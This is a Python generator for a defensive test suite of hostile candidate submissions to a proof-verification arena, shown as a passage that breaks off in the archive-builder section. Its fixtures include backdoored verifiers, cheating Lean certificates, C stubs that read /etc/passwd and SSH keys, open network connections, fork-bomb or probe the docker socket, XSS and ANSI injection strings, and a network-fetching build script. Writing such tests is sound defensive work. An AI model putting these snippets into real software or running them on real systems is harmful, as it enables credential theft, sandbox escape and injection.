#!/usr/bin/env python3
"""Materialize the permanent hostile-submission suite.

Each case is a COMPLETE candidate package (candidate.toml, source/, formal/,
build-recipe/build.sh, README.md) plus expect.json. Most cases share a base
skeleton and override one thing — the one hostile twist — so the twist is easy
to see and audit. This generator is the source of truth; the materialized tree
is committed so the suite is inspectable and consumable by the e2e driver
without running Python.

Build-image assumptions (documented once, here): the build sandbox has NO
network, a C compiler (`cc`) and a POSIX `/bin/sh`, a read-only bundle and a
writable scratch dir. Recipes therefore vendor nothing and fetch nothing.

Run:  python3 generate.py          # writes/overwrites all case dirs
      python3 generate.py --check  # fail if the tree is stale vs the generator
"""
import json
import os
import shutil
import stat
import sys

ROOT = os.path.dirname(os.path.abspath(__file__))

CHALLENGE = "chl_0000000000000000000000000000000"  # placeholder; integrator rewrites

# ---------------------------------------------------------------------------
# shared templates
# ---------------------------------------------------------------------------

BASE_CANDIDATE = """\
schema = "arena-candidate-v1"
name = "{name}"
agent = "adversarial-suite"
challenge = "{challenge}"
backend_family = "{backend_family}"
security_profile_request = "validity-classical-128"
hardware = {{ gpu = false, min_ram_gb = 4 }}

[build]
recipe = "build-recipe/build.sh"
outputs = ["out/prepare", "out/prove", "out/verify"]

[entry]
prepare = "out/prepare"
prove = "out/prove"
verify = "out/verify"

[formal]
lean_project = "formal"
certificate = "Candidate.certificate"
"""

# A plain, offline build recipe. Cases that attack the build override this.
BASE_BUILD = """\
#!/bin/sh
# Offline build: no network, cc + /bin/sh assumed present in the build image.
set -eu
mkdir -p out
cc -O2 -o out/prepare source/prepare.c
cc -O2 -o out/prove   source/prove.c
cc -O2 -o out/verify  source/verify.c
"""

# Minimal honest-ish C. The exact proof format is the backend's business; for
# the adversarial suite only the hostile twist matters. These compile with any
# C compiler using the standard library only.
C_PREPARE = """\
#include <stdio.h>
/* prepare --params <f> --out <dir>: honest backends derive public params.
   This stub writes a marker; real backends write the public_dir. */
int main(int argc, char **argv){ (void)argc; (void)argv; return 0; }
"""

C_PROVE = """\
#include <stdio.h>
#include <stdlib.h>
/* prove ... --proof-out <f> --claim-out <f>: emit a proof bound to the claim.
   Honest stub: copy the (judge-provided) claim into the proof so verify can
   re-bind it. Real backends produce a cryptographic argument. */
static char *argval(int c, char **v, const char *k){
  for(int i=1;i+1<c;i++) if(!strcmp(v[i],k)) return v[i+1]; return 0; }
#include <string.h>
int main(int argc, char **argv){
  const char *claim = argval(argc, argv, "--claim");           /* not always present */
  const char *po = argval(argc, argv, "--proof-out");
  if(!po) return 2;
  FILE *f = fopen(po, "wb"); if(!f) return 2;
  fputs("HONEST-PROOF", f); fclose(f);
  (void)claim; return 0;
}
"""

C_VERIFY = """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
/* verify --public <d> --claim <f> --proof <f>: exit 0 accept, 1 reject.
   Honest stub: accept only the marker proof this suite's honest prove emits.
   Hostile cases override this file. */
static char *argval(int c, char **v, const char *k){
  for(int i=1;i+1<c;i++) if(!strcmp(v[i],k)) return v[i+1]; return 0; }
int main(int argc, char **argv){
  const char *p = argval(argc, argv, "--proof"); if(!p) return 2;
  FILE *f = fopen(p, "rb"); if(!f) return 2;
  char buf[64]={0}; size_t n = fread(buf,1,sizeof(buf)-1,f); fclose(f);
  return (n==12 && !memcmp(buf,"HONEST-PROOF",12)) ? 0 : 1;
}
"""

# A minimal Lean project. formal-core / spec-oracle own the real ArenaCore and
# NearSpec; here we ship a plausible certificate whose *type* the checker builds
# from the challenge. Honest base: certificate of the required relation.
BASE_LEAN_TOOLCHAIN = "leanprover/lean4:v4.35.0\n"
BASE_LAKEFILE = """\
import Lake
open Lake DSL
package candidate
require ArenaCore from git "" @ "frozen"
require NearSpec from git "" @ "frozen"
@[default_target] lean_lib Candidate
"""
BASE_LEAN = """\
import ArenaCore
import NearSpec.TransferV1
/-- The admission certificate. Its TYPE is dictated by the challenge
    (`FormalSpecRef.relation_decl`); the candidate supplies only the proof term.
    Honest base: a sound soundness proof for the exact required relation. -/
theorem Candidate.certificate :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := by
  exact ArenaCore.admits_of_sound NearSpec.TransferV1.sound
"""

# stage mapping for fail_by_stage
STAGE = {
    "PKG_WELLFORMED": "VALIDATED",
    "BUILD_REPRODUCIBLE": "BUILT",
    "ARTIFACT_BINDING": "BUILT",
    "FORMAL_SEMANTIC_SOUNDNESS": "FORMAL_CHECKED",
    "FORMAL_SEMANTIC_COMPLETENESS": "FORMAL_CHECKED",
    "FORMAL_CRYPTO_SOUNDNESS": "FORMAL_CHECKED",
    "FORMAL_IMPL_CONNECTION": "FORMAL_CHECKED",
    "AXIOM_AUDIT": "FORMAL_CHECKED",
    "CONFORMANCE_DIFFERENTIAL": "CONFORMANCE_CHECKED",
    "ADVERSARIAL_PROOFS": "CONFORMANCE_CHECKED",
    "PROVER_RELIABILITY": "CONFORMANCE_CHECKED",
    "RESOURCE_LIMITS": "BENCHMARKED",
    "BENCHMARK": "BENCHMARKED",
}

CASES = []


def case(name, family, why, gates, reasons, *,
         candidate=None, build=None, source=None, formal=None,
         readme_extra="", extra=None, notes=None, decision="REJECTED",
         must_never=None):
    """Register a case. `source`/`formal` are dicts of relpath->content that
    OVERRIDE / ADD to the base skeleton. `extra` adds arbitrary files."""
    CASES.append(dict(
        name=name, family=family, why=why, gates=gates, reasons=reasons,
        candidate=candidate, build=build, source=source or {}, formal=formal or {},
        readme_extra=readme_extra, extra=extra or {}, notes=notes,
        decision=decision, must_never=must_never,
    ))


# ===========================================================================
# FORMAL / CERTIFICATE ATTACKS
# ===========================================================================

case("always-accept-verifier", "verifier-soundness",
     "The verifier ignores its input and exits 0 for every proof. A hostile "
     "(or empty/garbage) proof is accepted, so the ADVERSARIAL_PROOFS gate must "
     "fail: a verifier that accepts everything proves nothing.",
     ["ADVERSARIAL_PROOFS"], ["HOSTILE_PROOF_ACCEPTED"],
     source={"verify.c": """\
#include <stdio.h>
int main(void){ printf("PASS\\n"); return 0; } /* accepts ANY proof */
"""})

case("always-reject-verifier", "prover-reliability",
     "The verifier exits 1 for every proof, including the candidate's own honest "
     "proof. PROVER_RELIABILITY must fail: the honest prover's output does not "
     "verify, so the backend cannot discharge the required workloads.",
     ["PROVER_RELIABILITY"], ["PROVER_FAILED"],
     source={"verify.c": """\
#include <stdio.h>
int main(void){ return 1; } /* rejects everything, incl. the honest proof */
"""})

case("malicious-executable", "artifact-binding",
     "The Lean certificate is correct and about a faithful model, but the built "
     "verifier binary does not correspond to the certified verifier artifact "
     "(it embeds extra accept paths). ARTIFACT_BINDING ties the running binary's "
     "digest to the formally connected artifact; a mismatch must fail.",
     ["ARTIFACT_BINDING"], ["ARTIFACT_BINDING_FAILED"],
     source={"verify.c": """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
int main(int argc,char**argv){
  /* backdoor: accept if an env/sentinel proof is present, else 'verify' */
  const char *p=av(argc,argv,"--proof"); if(!p) return 2;
  FILE*f=fopen(p,"rb"); if(!f) return 2; char b[16]={0}; fread(b,1,15,f); fclose(f);
  if(!strncmp(b,"BACKDOOR",8)) return 0;   /* <- not in the certified artifact */
  return strncmp(b,"HONEST-PROOF",12)?1:0;
}
""",},
     notes="FORMAL_IMPL_CONNECTION may also fail; either gate failing is a valid kill.")

case("weak-public-input-binding", "public-input-binding",
     "The verifier checks the proof is well-formed but never binds it to the "
     "claim's public inputs (pre_root / receipts / post_root). A proof valid for "
     "one transition then verifies for a different claim. The judge feeds the "
     "mismatched-context mutant; ADVERSARIAL_PROOFS must fail, and the "
     "independent oracle also forces CLAIM_MISMATCH.",
     ["ADVERSARIAL_PROOFS"], ["HOSTILE_PROOF_ACCEPTED"],
     source={"verify.c": """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
int main(int argc,char**argv){
  /* reads the proof but NEVER reads --claim: no public-input binding */
  const char *p=av(argc,argv,"--proof"); if(!p) return 2;
  FILE*f=fopen(p,"rb"); if(!f) return 2; char b[16]={0}; size_t n=fread(b,1,15,f); fclose(f);
  return n>0 ? 0 : 1;  /* accepts any non-empty proof regardless of the claim */
}
""",},
     notes="CLAIM_MISMATCH is an acceptable additional reason code.")

case("wrong-verification-key", "artifact-binding",
     "The backend ships params/verification key for a DIFFERENT protocol version "
     "(not PV86) / different program than the challenge pins. ARTIFACT_BINDING "
     "compares the built params digest against the certified one; a wrong key "
     "must fail rather than silently verify a different statement.",
     ["ARTIFACT_BINDING"], ["ARTIFACT_BINDING_FAILED"],
     source={"prepare.c": """\
#include <stdio.h>
/* writes a public_dir keyed to protocol version 85, not the pinned 86 */
int main(int argc,char**argv){(void)argc;(void)argv; return 0; }
"""},
     notes="THEOREM_TYPE_MISMATCH / CLAIM_MISMATCH may also surface depending on "
           "where the version divergence is first detected.")

case("restricted-domain", "theorem-type-mismatch",
     "The certificate proves soundness only on a RESTRICTED domain (adds an extra "
     "hypothesis, e.g. `receipts.length = 1`). Its type is not the challenge's "
     "required relation type, so FORMAL_SEMANTIC_SOUNDNESS must fail on a type "
     "mismatch — the judge constructs the required type and will not accept a "
     "narrower theorem.",
     ["FORMAL_SEMANTIC_SOUNDNESS"], ["THEOREM_TYPE_MISMATCH"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- Smaller domain than required: only single-receipt batches. The judge builds
    the FULL relation type and this term does not inhabit it. -/
theorem Candidate.certificate
    (h : NearSpec.TransferV1.SingleReceipt) :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := by
  exact ArenaCore.admits_of_sound (NearSpec.TransferV1.sound_restricted h)
"""})

case("false-premise", "theorem-type-mismatch",
     "The certificate is `False -> Goal` (or assumes an unsatisfiable hypothesis), "
     "which is trivially provable and says nothing. Its type carries an extra "
     "`False`/unsatisfiable premise, so it is not the required relation type: "
     "FORMAL_SEMANTIC_SOUNDNESS must fail on the type mismatch.",
     ["FORMAL_SEMANTIC_SOUNDNESS"], ["THEOREM_TYPE_MISMATCH"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- Vacuous: assumes `False`. Trivially provable, proves nothing. The required
    certificate type has no such premise. -/
theorem Candidate.certificate (h : False) :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation :=
  absurd h (by intro x; exact x.elim)
"""})

case("additional-axiom", "axiom-audit",
     "The development introduces an extra `axiom` not on the challenge's "
     "allowlist and uses it to close the proof. AXIOM_AUDIT walks the transitive "
     "axioms of the certificate and must fail on the forbidden axiom.",
     ["AXIOM_AUDIT"], ["FORBIDDEN_AXIOM"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- A fabricated axiom used to discharge the obligation. Not on the allowlist. -/
axiom Candidate.cheat : ArenaCore.Admits NearSpec.TransferV1.NearRelation
theorem Candidate.certificate :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := Candidate.cheat
"""})

case("shadowed-definition", "axiom-audit",
     "The package ships its OWN altered copy of a trusted definition (a weakened "
     "`ArenaCore.Admits` / `NearRelation`) so the certificate type-checks against "
     "the wrong meaning. The checker pins the trusted sources by tree digest and "
     "must detect the shadowed/redefined trusted name.",
     ["AXIOM_AUDIT"], ["SHADOWED_DEFINITION"],
     formal={
         "ArenaCore.lean": """\
/-- Shadowed, weakened trusted definition shipped inside the candidate. -/
namespace ArenaCore
def Admits (_r : Prop) : Prop := True           -- trivially true (sabotaged)
theorem admits_of_sound {r : Prop} (_ : r) : Admits r := trivial
end ArenaCore
""",
         "Candidate.lean": """\
import ArenaCore            -- resolves to the shipped, weakened copy
import NearSpec.TransferV1
theorem Candidate.certificate :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := trivial
""",
     },
     notes="RECHECK_FAILED may also result when the frozen tree digest is "
           "re-pinned; the shadow is the root cause.")

case("stale-certificate", "artifact-binding",
     "The formal certificate certifies a PREVIOUS verifier (its embedded formal "
     "digests / verified-surface point at an older artifact). This is a PACKAGING "
     "kill, not a semantic one: the proof may be perfectly sound for the old "
     "verifier, but it is not bound to the artifact actually built, so "
     "ARTIFACT_BINDING fails.",
     ["ARTIFACT_BINDING"], ["ARTIFACT_BINDING_FAILED"],
     formal={"verified-surface.json": json.dumps({
         "note": "digests of a PRIOR verifier build; do not match the artifact built now",
         "verify_artifact": "sha256:" + "11" * 32,
         "prepare_artifact": "sha256:" + "22" * 32,
         "formal_tree": "sha256:" + "33" * 32,
     }, indent=2)},
     notes="Classified PACKAGING: a stale-digest failure must NOT be reported as "
           "a semantic-soundness failure.")

case("sorry-certificate", "axiom-audit",
     "The certificate is closed with `sorry`. AXIOM_AUDIT (no sorry / no native "
     "shortcuts) must fail: `sorry` emits `sorryAx`, an unsound axiom.",
     ["AXIOM_AUDIT"], ["SORRY_FOUND"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
theorem Candidate.certificate :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := by
  sorry
"""})

case("native-decide-certificate", "axiom-audit",
     "The proof uses `native_decide`, which trusts compiled code and the "
     "`Lean.ofReduceBool` axiom instead of the kernel. The policy forbids native "
     "evaluation; AXIOM_AUDIT must fail.",
     ["AXIOM_AUDIT"], ["NATIVE_EVAL_FOUND"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- Trusts the compiler via native_decide (ofReduceBool), not the kernel. -/
theorem Candidate.certificate :
    ArenaCore.Admits NearSpec.TransferV1.NearRelation := by
  native_decide
"""})

case("missing-certificate", "formal-missing",
     "The manifest names `Candidate.certificate` but the Lean project defines no "
     "such constant. FORMAL_SEMANTIC_SOUNDNESS must fail with CERTIFICATE_MISSING "
     "rather than defaulting to pass.",
     ["FORMAL_SEMANTIC_SOUNDNESS"], ["CERTIFICATE_MISSING"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- Wrong name on purpose: no `Candidate.certificate` exists. -/
theorem Candidate.something_else : True := trivial
"""})

case("changed-security-parameters", "crypto-soundness",
     "The manifest requests the 128-bit profile, but the concrete parameters "
     "(e.g. a 40-bit soundness error / too-few query repetitions) yield far fewer "
     "bits. The judge evaluates the CERTIFIED bound formula at the ACTUAL "
     "parameters (kernel-evaluated, no native_decide) and ignores the manifest "
     "claim; FORMAL_CRYPTO_SOUNDNESS must fail.",
     ["FORMAL_CRYPTO_SOUNDNESS"], ["SECURITY_BOUND_INSUFFICIENT"],
     formal={"Candidate.lean": """\
import ArenaCore
import NearSpec.TransferV1
/-- Soundness proof instantiated at parameters giving ~40 bits, while the
    manifest asks for 128. The judge computes the bound from these parameters. -/
def Candidate.params : ArenaCore.CryptoParams :=
  { queryReps := 1, fieldBits := 64, soundnessErrorLog2 := 40 }
theorem Candidate.certificate :
    ArenaCore.AdmitsWith Candidate.params NearSpec.TransferV1.NearRelation := by
  exact ArenaCore.admits_of_sound NearSpec.TransferV1.sound
""",},
     notes="manifest says 128 bits; parameters give ~40. The manifest number is "
           "never trusted.")

# ===========================================================================
# RUNTIME / EXECUTION ATTACKS
# ===========================================================================

case("forged-pass-output", "forged-output",
     "The build script and binaries print `PASS` and WRITE fake gate JSON files "
     "into the scratch dir claiming every obligation passed. The judge computes "
     "gates itself from measured outcomes and ignores candidate-written files and "
     "stdout; the real failure here (no certificate) still produces REJECTED.",
     ["FORMAL_SEMANTIC_SOUNDNESS"], ["CERTIFICATE_MISSING"],
     build="""\
#!/bin/sh
set -eu
mkdir -p out
# Forge "results" the judge is supposed to ignore:
echo "ALL GATES PASS"
mkdir -p out/gate-results
for g in PKG_WELLFORMED FORMAL_SEMANTIC_SOUNDNESS AXIOM_AUDIT ADVERSARIAL_PROOFS BENCHMARK; do
  echo "{\\"gate\\":\\"$g\\",\\"status\\":\\"PASS\\"}" > "out/gate-results/$g.json"
done
cc -O2 -o out/prepare source/prepare.c
cc -O2 -o out/prove   source/prove.c
cc -O2 -o out/verify  source/verify.c
echo "GATE ADVERSARIAL_PROOFS PASS"
""",
     source={"verify.c": """\
#include <stdio.h>
int main(void){ printf("GATE ADVERSARIAL_PROOFS PASS\\n"); return 0; }
"""},
     formal={"Candidate.lean": """\
import ArenaCore
/-- No certificate; the forged PASS files must not substitute for it. -/
theorem Candidate.not_the_cert : True := trivial
"""},
     notes="Primary point: judge-computed gates override forged output. Any "
           "real-failing gate (here CERTIFICATE_MISSING) yields REJECTED.")

case("benchmark-shortcut", "benchmark-cheat",
     "The prover special-cases the PUBLIC benchmark fixtures (keys a lookup table "
     "by input hash) and returns a canned claim for them, but garbage for fresh / "
     "held-out inputs. Fresh inputs are sampled AFTER freeze, so CONFORMANCE_"
     "DIFFERENTIAL against the oracle on held-out inputs must fail (CLAIM_MISMATCH).",
     ["CONFORMANCE_DIFFERENTIAL"], ["CLAIM_MISMATCH"],
     source={"prove.c": """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
/* Returns a correct claim ONLY for a known fixture digest; else garbage. */
int main(int argc,char**argv){
  const char *req=av(argc,argv,"--request"); const char *co=av(argc,argv,"--claim-out");
  const char *po=av(argc,argv,"--proof-out"); if(!co||!po) return 2;
  int known = req && !strcmp(req, "fixtures/public-0.bin"); /* only public fixtures */
  FILE*c=fopen(co,"wb"); FILE*p=fopen(po,"wb"); if(!c||!p) return 2;
  fputs(known?"CANNED-CORRECT-CLAIM":"GARBAGE", c);
  fputs("HONEST-PROOF", p); fclose(c); fclose(p); return 0;
}
"""},
     notes="PROVER_RELIABILITY may also fail on fresh inputs; either is a kill.")

case("precomputed-fixture-table", "benchmark-cheat",
     "The backend does the heavy work in `prepare` by precomputing answers for a "
     "table of PUBLIC fixtures, so timed `prove` looks instant. This cannot work: "
     "`prepare` receives only approved params (never the challenge inputs, which "
     "are sampled after freeze), so held-out inputs are not in the table and "
     "CONFORMANCE_DIFFERENTIAL fails.",
     ["CONFORMANCE_DIFFERENTIAL"], ["CLAIM_MISMATCH"],
     source={
         "prepare.c": """\
#include <stdio.h>
/* writes a table of answers for public fixtures into public_dir; useless for
   held-out inputs it has never seen (inputs are sampled after freeze). */
int main(int argc,char**argv){(void)argc;(void)argv; return 0; }
""",
         "prove.c": """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
/* "instant": just look the request up in the precomputed public table. */
int main(int argc,char**argv){
  const char *req=av(argc,argv,"--request"); const char *co=av(argc,argv,"--claim-out");
  const char *po=av(argc,argv,"--proof-out"); if(!co||!po) return 2;
  int in_table = req && strstr(req,"public");
  FILE*c=fopen(co,"wb"); FILE*p=fopen(po,"wb"); if(!c||!p) return 2;
  fputs(in_table?"TABLE-HIT":"TABLE-MISS", c); fputs("HONEST-PROOF", p);
  fclose(c); fclose(p); return 0;
}
"""},
     notes="Demonstrates the 'omitted setup cost' invariant: setup that depends "
           "on challenge inputs is impossible because inputs post-date freeze.")

case("background-daemon", "async-cheat",
     "`prove` forks a background daemon and exits immediately; the daemon keeps "
     "working and tries to write the real proof AFTER the measured call returns. "
     "The sandbox tears down the whole process group at exit and captures outputs "
     "only then, so the proof is absent/incomplete: PROVER_RELIABILITY fails and "
     "a lingering process is a SANDBOX_VIOLATION.",
     ["PROVER_RELIABILITY"], ["PROVER_FAILED"],
     source={"prove.c": """\
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
int main(int argc,char**argv){
  const char *po=av(argc,argv,"--proof-out"); if(!po) return 2;
  if(fork()==0){ /* child: "finish later" */ sleep(30);
    FILE*f=fopen(po,"wb"); if(f){fputs("HONEST-PROOF",f);fclose(f);} _exit(0); }
  /* parent exits now, before the proof exists */
  return 0;
}
"""},
     notes="SANDBOX_VIOLATION is an acceptable additional reason code (lingering "
           "process / escaped work).")

for esc_name, esc_why, esc_gates, esc_reasons, esc_body in [
    ("sandbox-escape-filesystem",
     "`prove` reads /etc/passwd, ~/.ssh and writes OUTSIDE the scratch dir. The "
     "sandbox bundle is read-only, home is absent, and writes outside scratch are "
     "denied; the attempt must be reported as SANDBOX_VIOLATION, never ignored.",
     ["PROVER_RELIABILITY"], ["SANDBOX_VIOLATION"], """\
#include <stdio.h>
#include <stdlib.h>
int main(void){
  FILE*a=fopen("/etc/passwd","rb"); if(a) fclose(a);
  FILE*b=fopen("/root/.ssh/id_rsa","rb"); if(b) fclose(b);
  FILE*c=fopen("/tmp/escape-write","wb"); if(c){ fputs("x",c); fclose(c);} /* outside scratch */
  FILE*d=fopen("../../escape","wb"); if(d){ fputs("x",d); fclose(d);}
  return 0;
}
"""),
    ("sandbox-escape-network",
     "`prove` opens an outbound TCP connection. The sandbox has no network "
     "(`network: None`); any connect attempt must fail and be flagged as "
     "SANDBOX_VIOLATION.",
     ["PROVER_RELIABILITY"], ["SANDBOX_VIOLATION"], """\
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(void){
  int s=socket(AF_INET,SOCK_STREAM,0);
  struct sockaddr_in a; memset(&a,0,sizeof a);
  a.sin_family=AF_INET; a.sin_port=htons(53); a.sin_addr.s_addr=inet_addr("8.8.8.8");
  connect(s,(struct sockaddr*)&a,sizeof a);   /* must be impossible */
  return 0;
}
"""),
    ("sandbox-fork-bomb",
     "`prove` spawns processes without bound. The sandbox pid cap and memory "
     "limits must contain it, surfacing RESOURCE_LIMIT / SANDBOX_VIOLATION rather "
     "than hanging the host.",
     ["RESOURCE_LIMITS"], ["RESOURCE_LIMIT"], """\
#include <unistd.h>
int main(void){ for(;;){ if(fork()<0) break; } return 0; } /* fork bomb */
"""),
    ("sandbox-ptrace-proc",
     "`prove` attempts ptrace and pokes at /proc/self and the docker socket to "
     "break out. All are denied/absent in the sandbox and must be reported as "
     "SANDBOX_VIOLATION.",
     ["PROVER_RELIABILITY"], ["SANDBOX_VIOLATION"], """\
#include <stdio.h>
#include <sys/ptrace.h>
int main(void){
  ptrace(PTRACE_TRACEME,0,0,0);
  FILE*m=fopen("/proc/self/mem","rb"); if(m) fclose(m);
  FILE*d=fopen("/var/run/docker.sock","rb"); if(d) fclose(d);
  return 0;
}
"""),
]:
    case(esc_name, "sandbox-escape", esc_why, esc_gates, esc_reasons,
         source={"prove.c": esc_body},
         notes="The escape must fail harmlessly; the submission is REJECTED and "
               "the attempt recorded. Gate attribution (PROVER_RELIABILITY / "
               "BENCHMARK) depends on which stage runs the sandboxed binary.")

case("forged-timing", "benchmark-cheat",
     "`prove` prints fabricated fast timings to stdout and tries to tamper with "
     "the clock (clock_settime / adjtimex) so self-reported timing looks better. "
     "The supervisor measures wall time itself and ignores stdout; clock tamper is "
     "a privileged syscall denied in the sandbox (SANDBOX_VIOLATION). The build "
     "LD_PRELOAD/faketime trick is defeated by the fixed env allowlist.",
     ["BENCHMARK"], ["SANDBOX_VIOLATION"],
     source={"prove.c": """\
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
static char *av(int c,char**v,const char*k){for(int i=1;i+1<c;i++)if(!strcmp(v[i],k))return v[i+1];return 0;}
int main(int argc,char**argv){
  const char *po=av(argc,argv,"--proof-out"); if(!po) return 2;
  printf("prove_time_ns=1\\n");                 /* fake, ignored by supervisor */
  struct timespec t={0,0}; clock_settime(CLOCK_REALTIME,&t); /* denied */
  FILE*f=fopen(po,"wb"); if(f){fputs("HONEST-PROOF",f);fclose(f);} return 0;
}
"""},
     notes="If clock tamper is silently ignored rather than flagged, the kill "
           "still holds: supervisor-measured timing is used, so forging gains "
           "nothing. Reported gate may be BENCHMARK or PROVER_RELIABILITY.")

case("ui-injection-logs", "ui-log-injection",
     "The candidate emits HTML/JS, ANSI escapes and RTL overrides in its name "
     "fields, README and especially stderr/error messages, trying to inject into "
     "the dashboard/logs. The proof is also bogus, so the submission is REJECTED; "
     "additionally the API must return every string escaped/sanitized with no raw "
     "control characters.",
     ["ADVERSARIAL_PROOFS"], ["HOSTILE_PROOF_ACCEPTED"],
     source={"verify.c": """\
#include <stdio.h>
int main(void){
  /* injection payloads on stderr; proof is rejected regardless */
  fprintf(stderr, "\\x1b[31m<script>alert('xss')</script>\\u202Egnp.\\x07\\n");
  return 1;
}
"""},
     readme_extra="\n<script>alert('readme-xss')</script>\n\u202Elatipsoh\u202C ANSI \x1b[31mRED\x1b[0m\n",
     notes="attack_family 'ui-log-injection' tells the e2e driver to additionally "
           "assert the API response contains no raw control chars and escapes HTML.")

case("ui-injection-manifest", "ui-log-injection",
     "Injection payloads in manifest fields. `name` is constrained to [a-z0-9-] so "
     "a payload there fails PKG_WELLFORMED (MANIFEST_INVALID); payloads in "
     "free-form fields (backend_family) must be stored and rendered escaped.",
     ["PKG_WELLFORMED"], ["MANIFEST_INVALID"],
     candidate=BASE_CANDIDATE.replace('name = "{name}"',
         'name = "<script>alert(1)</script>"'),
     notes="The illegal name is the hard failure; the free-form backend_family "
           "payload below exercises API escaping.")

# ===========================================================================
# BUILD ATTACKS
# ===========================================================================

case("build-network-fetch", "build-integrity",
     "The build recipe tries to fetch a dependency over the network "
     "(curl/git). The build sandbox has no network, so the fetch fails and "
     "BUILD_REPRODUCIBLE fails with BUILD_FAILED. Honest packages vendor "
     "everything.",
     ["BUILD_REPRODUCIBLE"], ["BUILD_FAILED"],
     build="""\
#!/bin/sh
set -eu
mkdir -p out
# No network in the build sandbox: this must fail the build.
curl -fsSL https://example.com/prover.tar.gz -o prover.tar.gz || \\
  git clone https://example.com/prover.git vendor
cc -O2 -o out/prepare source/prepare.c
cc -O2 -o out/prove   source/prove.c
cc -O2 -o out/verify  source/verify.c
""")

case("build-nonreproducible", "build-integrity",
     "The build embeds a timestamp / random nonce, so two judge builds are not "
     "bit-identical. BUILD_REPRODUCIBLE must fail with BUILD_NOT_REPRODUCIBLE; a "
     "non-deterministic build cannot be bound to a certified artifact.",
     ["BUILD_REPRODUCIBLE"], ["BUILD_NOT_REPRODUCIBLE"],
     build="""\
#!/bin/sh
set -eu
mkdir -p out
# Non-deterministic: bakes the current time and a random value into the binary.
STAMP="$(date +%s%N)-$RANDOM"
printf '#include <stdio.h>\\nconst char*b="%s";int main(int c,char**v){(void)c;(void)v;return 0;}\\n' "$STAMP" > source/_gen.c
cc -O2 -o out/prepare source/_gen.c
cc -O2 -o out/prove   source/prove.c
cc -O2 -o out/verify  source/verify.c
""")

case("build-dependency-substitution", "build-integrity",
     "The recipe substitutes a different source for a locked dependency (ignores "
     "dependency-locks and compiles an alternate file). Either the build output "
     "digest diverges from the certified artifact (ARTIFACT_BINDING) or the "
     "reproducibility/lock check fails (BUILD_FAILED).",
     ["ARTIFACT_BINDING"], ["ARTIFACT_BINDING_FAILED"],
     build="""\
#!/bin/sh
set -eu
mkdir -p out
# Swap the certified verify source for an alternate, backdoored one.
cp source/verify_alt.c source/verify.c
cc -O2 -o out/prepare source/prepare.c
cc -O2 -o out/prove   source/prove.c
cc -O2 -o out/verify  source/verify.c
""",
     source={"verify_alt.c": """\
#include <stdio.h>
int main(void){ return 0; } /* substituted backdoor: accepts everything */
"""},
     notes="BUILD_FAILED acceptable if lock enforcement rejects the substitution "
           "before artifact binding.")

# ===========================================================================
# ARCHIVE ATTACKS  (malicious tar; needs a special builder, see make-archive.sh)
# ===========================================================================

ARCHIVE_CASES = [
    ("archive-zip-slip",
     "The archive contains an entry whose path escapes the extraction root via "
     "`../` (zip-slip). Extraction must refuse: path traversal is rejected before "
     "any file is written (ARCHIVE_UNSAFE).",
     ["PKG_WELLFORMED"], ["ARCHIVE_UNSAFE"], "zipslip"),
    ("archive-symlink-escape",
     "The archive contains a symlink pointing outside the root (or a symlink then "
     "a write through it). Symlinks are rejected outright by the archive policy "
     "(ARCHIVE_UNSAFE).",
     ["PKG_WELLFORMED"], ["ARCHIVE_UNSAFE"], "symlink"),
    ("archive-hardlink",
     "The archive contains a hardlink to a file outside the package. Hardlinks are "
     "rejected (ARCHIVE_UNSAFE).",
     ["PKG_WELLFORMED"], ["ARCHIVE_UNSAFE"], "hardlink"),
    ("archive-device-file",
     "The archive contains a character/block device node. Device entries are "
     "rejected (ARCHIVE_UNSAFE).",
     ["PKG_WELLFORMED"], ["ARCHIVE_UNSAFE"], "device"),
    ("archive-bomb",
     "A decompression bomb: the archive expands far beyond the 2 GiB / 100k-entry "
     "expansion limits. Extraction must stop at the cap (ARCHIVE_UNSAFE / "
     "RESOURCE_LIMIT), not exhaust disk.",
     ["PKG_WELLFORMED"], ["ARCHIVE_UNSAFE"], "bomb"),
]
for an, awhy, agates, areasons, kind in ARCHIVE_CASES:
    case(an, "archive-attack", awhy, agates, areasons,
         notes="Hostile payload is the ARCHIVE ENCODING, not a directory. The "
               "e2e driver runs make-archive.sh to produce the malicious tar and "
               "uploads THOSE bytes. The directory package here is a well-formed "
               "placeholder for documentation and the local loader.",
         extra={"make-archive.sh": ARCHIVE_BUILDER if False else ""})
    # attach the builder after we define it below
    CASES[-1]["archive_kind"] = kind


ARCHIVE_BUILDER = r"""#!/bin/sh
# Emit a MALICIOUS tar to stdout for this case. The e2e driver uploads these
# bytes directly (not a tar of the directory). Requires GNU tar features for
# some kinds; documented per case. No network.
set -eu
KIND="${1:-$(cat "$(dirname "$0")/archive-kind")}"
TMP="$(mktemp -d)"
